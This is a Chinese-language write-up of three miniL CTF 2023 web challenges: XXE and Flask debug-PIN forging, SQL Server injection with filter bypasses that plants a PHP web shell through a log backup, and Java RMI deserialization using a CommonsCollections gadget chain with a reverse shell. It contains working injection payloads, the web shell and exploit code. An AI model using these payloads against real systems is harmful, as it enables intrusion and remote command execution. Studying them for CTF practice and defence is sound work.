# 2023 miniL Web Write Up

#### 熬夜型rx直播切片委员会 passers-by

不得不说的是，由于web环境都已经关闭，没办法截图体现，只能找一些以前的截图放上来，给您道歉了！**磕头！ 哐！哐！哐！orz**

---

###目录

- [2023 miniL Web Write Up](#2023-minil-web-write-up)
      - [熬夜型rx直播切片委员会 passers-by](#熬夜型rx直播切片委员会-passers-by)
  - [fake\_login ](#fake_login-)
  - [ezsql ](#ezsql-)
      - [一些绕过小知识](#一些绕过小知识)
  - [minijava ](#minijava-)

## fake_login <a name="fake_login" ></a>

映入眼帘的是一个login界面

瞎试试有没有什么sql注入，哦不是php那没事了

我们通过抓包发现传输了一个xml信息，看到xml第一时间想到可能有XXE注入，关于XXE注入可以上网查询XXE，顺便也会查到相关的[文档类型定义（DTD）](https://www.w3school.com.cn/dtd/dtd_intro.asp)，都是xml的玩应，通过这一步我们可以通过服务器获取服务器内的资源以及通过服务器访问其他服务器打一个SSTI

虽然说我们访问到资源了，但是没办法执行系统命令，题干表示在/flag下

![你好皮](https://s3.bmp.ovh/imgs/2023/05/09/c13275ede6399ba1.png)

你好皮

一般我习惯性会读/etc/passwd

然后试试读取源码

给xxe瞎写几个分号和&，诶呀，报错啦

debug模式应该是开启的然后我们可以得知源码路径和python版本

/app/app.py(记得是，自己看) /usr/local/lib/python3.9/site-packages/flask/app.py

尝试抠出来源码

![flask应用的源码](https://s3.bmp.ovh/imgs/2023/05/09/679e7ab23a47f4ef.png)

flask应用的源码

我突然理解题目的意义

然后我跑到自己的浏览器上去，发现下面有个console pin的玩应（burp没有）

然后上网搜

哦，原来flask的console可以使用python的命令行，属于是没啥基础了

通过网络得知console的密码生成是有固定规律的，并且在3.8版本前后的生成逻辑不同。既然我们可以任意文件读取，我们直接生成pin然后进入console

console运行系统命令 whereis 查询flag，呃发现是之前的假flag，尝试读取python的环境变量， os.environ['flag']，啥也没有

环境变量命应当大写，尝试 os.environ['FLAG']，得到flag

---

## ezsql <a name="ezsql"></a>

sql注入他又来啦

~~sqlmap确实是一个应当掌握的技能，以后会好好学~~

出题人很贴心地把语句在前端回显了，我们尝试经典

```
-1' or 1=1#
```

通过回显我们发现'和空格消失了，我们进行fuzz测试

发现如下符号被过滤了

```
<>'"  //还有一些，我就记得这些了可以自己写脚本或者手动测试
```

通过写一些乱七八糟的内容提交上去得知数据库类型和版本

```
ERROR-MESSAGE: [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax 
```

通过题干我们知道要读取/flag文件，尝试任意文件读取或者getshell

#### 一些绕过小知识

```
通过Declare和十六进制0x 定义一个变量即可绕过引号过滤、空格过滤、字符过滤

\x01 可以代替空格（直接手打就是%01），通过编写脚本处理你的语句并生成可以提高效率
```


亲爱的gpt告诉我，可以通过sql语句执行系统命令

```
show advanced options
2;DECLARE @c varchar(255) SET @c=0x73686f7720616476616e636564206f7074696f6e73 
EXEC sp_configure @c, 1;
GO;
RECONFIGURE;
GO;--


external scripts enabled 65787465726e616c207363726970747320656e61626c6564
clr enabled 636c7220656e61626c6564
Ad Hoc Distributed Queries debian 416420486f632044697374726962757465642051756572696573
xp_cmdshell Windows Server 78705f636d647368656c6c
2;DECLARE @c varchar(255) SET @c=0x78705f636d647368656c6c 
EXEC sp_configure @c, 1;
GO;
RECONFIGURE;
GO;
--
```

通过我的注释你可以看出来我尝试了很多东西，因为xp_cmdshell这个功能不能用，导致没法直接使用系统命令

Ad Hoc Distributed Queries和clr都特别繁琐，放弃尝试

再查找可以找到一个叫做差异备份写🐎的玩法，可以自行查询

这里有一个小坑，差异备份可以 backup database或者 backup log，这两个东西都可以写入文件。

还有一个小坑，需要确定网站目录在哪里，写入进去才可以被访问

-*分界线*-

我们通过访问网站上随机名字的网页获得404信息，得知网站运行在Apache Debian系统，默认网站根目录为/var/www/html

尝试写🐎

发现backup database貌似没生成文件（网上差异备份很多都用back database）

查到一个backup log的，写payload

(这里insert被过滤，发现INSERT没有被过滤)

这里database名字可以注入查询出来，GitHub上payloadsAlltheThings都有，找对应的数据库类型

这里创建的表中类型为image，也有用text类型的不过是用在database备份上，我觉得应该是最后存在文件里被打开的编码能被解出来php马就行

写马
```php
<?php system($_GET['sh']) //执行get到的sh的值
```

```
2;ALTERdatabasectfsetRECOVERYFULL;

2;CREATEtable[dbo].azhe9(aimage)--

2;INSERTINTOdbo.azhe9(a)values(0x3c3f7068702073797374656d28245f4745545b277368275d293b3f3e)--

2;DECLARE@dvarchar(255)SET@d=0x2f7661722f7777772f68746d6c2f686f7273652e62616bBACKUPDATABASEctfTODISK=@d;--

2;DECLARE@dvarchar(255)SET@d=0x2f7661722f7777772f68746d6c2f686f7273652e706870BACKUPLOGctfTODISK=@dWITHINIT;--
```

咨询出题人我的shell 403，出题人说刷新一下index就行，为啥捏，神奇

在马的地方尝试 cat /flag，无回显，尝试ls发现为 f1ag，再次cat，获得flag

---

## minijava <a name="minijava"></a>

题目给出附件，是一个jar文件，作为java零基础，需要从头学习java😭

配置一下java环境，配了8，17，20，可以给他们分别定义环境变量，然后再定义一个JAVA_HOME = %JAVA_HOME8% （java8为例），然后在path里 %JAVA_HOME%/bin，然后删掉以前玩mc还是啥被瞎配的bin（折腾了好久）环境变量

可以给jar文件用7z解压缩出来，目的是解压缩出来pom.xaml

可以通过jd读jar文件源码，下面是一些源码，通过package可以知道文件位置所以我就不放了

Hello.class

```java
package BOOT-INF.classes.ctf.minil.java.minil.bean;

import java.rmi.Remote;
import java.rmi.RemoteException;

interface Hello extends Remote {
  void world(Object paramObject) throws RemoteException;
}
```

User.class

```java
package BOOT-INF.classes.ctf.minil.java.minil.bean;

import ctf.minil.java.minil.bean.Hello;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.rmi.registry.Registry;

public class User implements Serializable {
  private String username;
  
  private int age;
  
  private Registry registry;
  
  public User() {}
  
  public User(String username, int age) {
    this.username = username;
    this.age = age;
    this.registry = null;
  }
  
  public String getUsername() {
    return this.username;
  }
  
  public int getAge() {
    return this.age;
  }
  
  private Registry getRegistry() {
    return this.registry;
  }
  
  private void readObject(ObjectInputStream in) throws Exception {
    int magic = in.readInt();
    if (magic == 114514) {
      String username1;
      int age1;
      Registry registry1;
      Hello hello;
      byte byte1 = in.readByte();
      switch (byte1) {
        case 1:
          in.defaultReadObject();
          return;
        case 2:
          in.defaultReadObject();
          username1 = getUsername();
          age1 = getAge();
          registry1 = getRegistry();
          if (!username1.equals("L_team"))
            throw new Exception("Invalid username"); 
          if (age1 != 18)
            throw new Exception("Invalid age"); 
          hello = (Hello)registry1.lookup("hello");
          hello.world(this);
          return;
      } 
      throw new Exception("Invalid magic number");
    } 
  }
}
```

MainController.class
```java
package BOOT-INF.classes.ctf.minil.java.minil.controller;

import ctf.minil.java.minil.bean.User;
import java.io.ByteArrayInputStream;
import java.util.Base64;
import org.nibblesec.tools.SerialKiller;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class MainController {
  @ResponseBody
  @RequestMapping({"/"})
  public String index() {
    return "Welcome to miniL-CTF 2023!";
  }
  
  @ResponseBody
  @RequestMapping({"/hello"})
  public String hello(@RequestParam(name = "data", required = false) String data) {
    User user = null;
    try {
      byte[] userData = Base64.getDecoder().decode(data);
      SerialKiller serialKiller = new SerialKiller(new ByteArrayInputStream(userData), "serialkiller.conf");
      user = (User)serialKiller.readObject();
    } catch (Exception e) {
      return "unserialize error, no!";
    } 
    return "unserialize done, " + user.getUsername() + " have fun!";
  }
}
```

serialKiller.conf
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- serialkiller.conf -->
<config>
  <refresh>6000</refresh>
  <mode>
    <!-- set to 'false' for blocking mode -->
    <profiling>false</profiling>
  </mode>
  <blacklist>

  </blacklist>
  <whitelist>
        <regexp>ctf\..*</regexp>
        <regexp>java\.lang\..*</regexp>
        <regexp>sun\.rmi\.registry\..*</regexp>
        <regexp>java\.rmi\..*</regexp>
  </whitelist>
</config>
```

这里讲简短点

从Main Controller去看路由

我们需要到/hello去

有一个SerialKiller，使用白名单过滤了

然后这里有个User类，然后拿SerialKiller给过滤了一下然后序列化

有序列化就可能有反序列化漏洞，恶补一下

[观看视频学习CC链](https://www.bilibili.com/video/BV1no4y1U7E1)，我就跟了个cc1大概了解了一下，学习内容放在末尾，从pom.xml也可以得知有反序列化rce的包common-collections版本为3.2.2

还看到有一个rmi，可自行上网学习，总的来说就是分布式的玩意儿，客户端去找注册中心问我要的服务在哪个ip哪个端口，然后再拿着去请求服务器，然后在服务器上运行请求的方法（类实现了Remote接口），然后比如说void就拜拜了，然后string类型可能还返回来个啥玩意，在底层下通过socket实现，然后抽象化，每个环节全部都序列化反序列化，因此可以造成任意反序列化，在早版本还可以rce，现在可以找反序列化rce的包来进行rce。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
		 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.7.11</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>ctf.minil.java</groupId>
	<artifactId>minil</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>minil</name>
	<description>minil</description>
	<properties>
		<java.version>1.8</java.version>
	</properties>
	<dependencies>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.nibblesec</groupId>
			<artifactId>serialkiller</artifactId>
			<version>0.4</version>
		</dependency>

		<dependency>
			<groupId>commons-collections</groupId>
			<artifactId>commons-collections</artifactId>
			<version>3.2.1</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
	</dependencies>

	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
			</plugin>
		</plugins>
	</build>

</project>

```

这里我误入歧途了还，因为rmi在java旧版本本身也有rce，后来看眼版本应该是不太可能。

特别建议复现一个环境出来，因为发现了各种问题。

使用idea编辑器，开spring boot项目配置 maven环境， 复制pom.xaml进去配置好环境。

这里有两个坑，一个是magic number那里，需要重写payload的User里write Object方法，而不是自己在oos（outPutStream）里写入（writeInt）

还有一个坑，反序列化之后有一个**serialVersionUID**的玩意儿，这些都是需要在自己复现的环境里开debug一点一点调才能调出来的，在payload中自己定义好**serialVersionUID**使得反序列化能够被正常读取。

构造函数是不能改的，否则反序列化会出问题，使用反射更改registry

自己需要有一个公网服务器，用来当rmi注册中心（下毒的），使得任意反序列化发生在Client端（试图调用rmi的Remote接口的服务器），随后通过cc链达到rce，随后nc开一个监听端口接收被攻击端的反弹shell达成getshell

payload如下：

再开一个项目，把User的构造函数、方法和变量照抄，自定义serialVersionUID，重写writeObject方法
```java
package ctf.minil.java.minil.bean;

import java.io.*;
import java.rmi.registry.Registry;

public class User implements Serializable {

    private static final long serialVersionUID = -1464281268829007195L;

    private String username;

    private int age;

    private Registry registry;

    public String getUsername() {
        return this.username;
    }

    public int getAge() {
        return this.age;
    }

    private Registry getRegistry() {
        return this.registry;
    }

    public Registry checkGetRegistry() {return this.registry;}

    public User() {}

    private void writeObject(ObjectOutputStream out) throws IOException {
        out.writeInt(114514);
        out.writeByte(2);
        out.defaultWriteObject();
    }


    public User(String username, int age) {
        this.username = username;
        this.age = age;
        this.registry = null;
    }
}

```

序列化对象，弄好LocateRegistry.getRegistry配置注册中心并打印base64编码

当时在学习测试rmi的时候，得知packag包名和class类名必须完全相同才能连到rmi服务器，所以有package
```java
package ctf.minil.java.minil.bean;

import java.io.*;
import java.lang.reflect.Field;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Base64;

public class Payload{
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        Registry registry = LocateRegistry.getRegistry("👴的服务器ip", 5641);
        User payload = new User("L_team", 18);
        //test reflection inject

        //before
        System.out.print(payload.checkGetRegistry());

        //operation 通过反射修改User类的私有成员registry
        Class p = payload.getClass();
        Field f = p.getDeclaredField("registry");
        f.setAccessible(true);
        Object reg = f.get(payload);
        f.set(payload, registry);

        //after
        System.out.print(payload.checkGetRegistry());

        //Serialize
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(payload);  //这里已经重写完writeObject，
        byte[] serializedObject = bos.toByteArray();

        //print payload
        System.out.print("\n\n" + Base64.getEncoder().encodeToString(serializedObject));


        User user = new User("L_team", 18);

        ByteArrayOutputStream _bos = new ByteArrayOutputStream();
        ObjectOutputStream _oos = new ObjectOutputStream(_bos);
        _oos.writeObject(user);
        byte[] bytes1 = _bos.toByteArray();
        String encode = java.util.Base64.getEncoder().encodeToString(bytes1);
        System.out.println("\n\n" + encode);
```

这里做的努力都是为了绕过一个一个if让rmi可以去反序列化，走到

```
hello = (Hello)registry1.lookup("hello");
```

这一步然后造成任意反序列化。

后面我直接化身脚本小子！

yososerial工具可以轻松地部署恶意rmi注册中心并且使用他们做好的攻击链

上到公网服务器，使用yososerial监听，把执行的命令写好，那就把反弹shell那个命令写上就可以了

逐个尝试CommonCollections攻击链，试到第五个在本地环境弹出计算器，好的，把payload改一改扔给靶机

得到shell，cat /flag得到flag

---

CC1的学习记录（拽英语是吧）
那个B站视频还是很大帮助的orz [链接](https://www.bilibili.com/video/BV1no4y1U7E1)
```java
package ctf.minil.java.minil.bean;

import ctf.minil.java.minil.bean.Hello;
import ctf.minil.java.minil.bean.HelloImp;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.File;
import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import java.util.HashMap;
import java.util.Map;

public class RMIServer {
    public static void main(String[] args) throws IOException, AlreadyBoundException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        //Hello h = new HelloImp();
        Registry r = LocateRegistry.createRegistry(5641);

        //this is unserializable, we need to let it be serializable
        //Runtime.getRuntime().exec("calc", null);
        Runtime ru = Runtime.getRuntime();

        //transform
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(ru, "calc");

        //first calc pop up
        InvokerTransformer _invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        //invokerTransformer.transform()
        HashMap<Object, Object> _map = new HashMap<>();
        _map.put("payload", "try");
        //TransformedMap.checkSetValue(Object value) {
        //        return this.valueTransformer.transform(value);
        //    }
        Map<Object, Object> _transformedMap = TransformedMap.decorate(_map, null, _invokerTransformer);


        //this.parent.checkSetValue(value);
//        public Object setValue(Object value) {
//            value = this.parent.checkSetValue(value);
//            return this.entry.setValue(value);
//        }
        //second calc pop up
        for(Map.Entry entry:_transformedMap.entrySet()){
            entry.setValue(ru);
        }


        //Although Runtime is not serializable, Class is serializable
        Class c = Runtime.class;
        Method _getRuntimeMethod = c.getMethod("getRuntime", null);
        Runtime _runtime = (Runtime) _getRuntimeMethod.invoke(null, null);
        Method _execMethod = c.getMethod("exec", String.class);
        //third
        _execMethod.invoke(_runtime, "calc");

        ////Use Transform to implement this
        Runtime.getRuntime().exec("calc");
        //Method = Runtime.getRuntime()
        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        //Runtime = Method -> Runtime.getRuntime()
        Runtime runtime = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
        //Runtime.exec("calc") -> Runtime.getRuntime().exec("calc")
        //public Process exec(String command, String[] envp) throws IOException
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(runtime);

        //until now, four calculators should pop up
        //next, we need to wrap them up
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //here, we only need Runtime.class to be transformed, then they transform automatically
        chainedTransformer.transform(Runtime.class);
        //until now, five calculators should pop up

        //wrapping...
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "try");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Class handler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = handler.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);

//        We don't simply use Override.class, because in AnnotationInvocationHandler.java
//        private void readObject(java.io.ObjectInputStream s)
//        ...
//        ...
//        for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {
//                    String name = memberValue.getKey();
//                    Object value = null;
//                    Class<?> memberType = memberTypes.get(name);
//        A null judgment blocks getValue
//                    if (memberType != null) {  // i.e. member still exists
//                        value = memberValue.getValue();
//                        if (!(memberType.isInstance(value) ||
//                              value instanceof ExceptionProxy)) {
//                            value = new AnnotationTypeMismatchExceptionProxy(
//                                        objectToString(value))
//                                .setMember(annotationType.members().get(name));
//                        }
//                    }
//                    mv.put(name, value);
//                }

        //public @interface Target {
        //    /**
        //     * Returns an array of the kinds of elements an annotation type
        //     * can be applied to.
        //     * @return an array of the kinds of elements an annotation type
        //     * can be applied to
        //     */
        //****ElementType[] value(); <---this is what we need  /in AnnotationInvocationHandler.java: Class<?> memberType = memberTypes.get(name);
        //}
        //this is why we write map.put("value", "try");
        Object payload = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
        //now you can use this object to do unserialize attack

    }
}

```

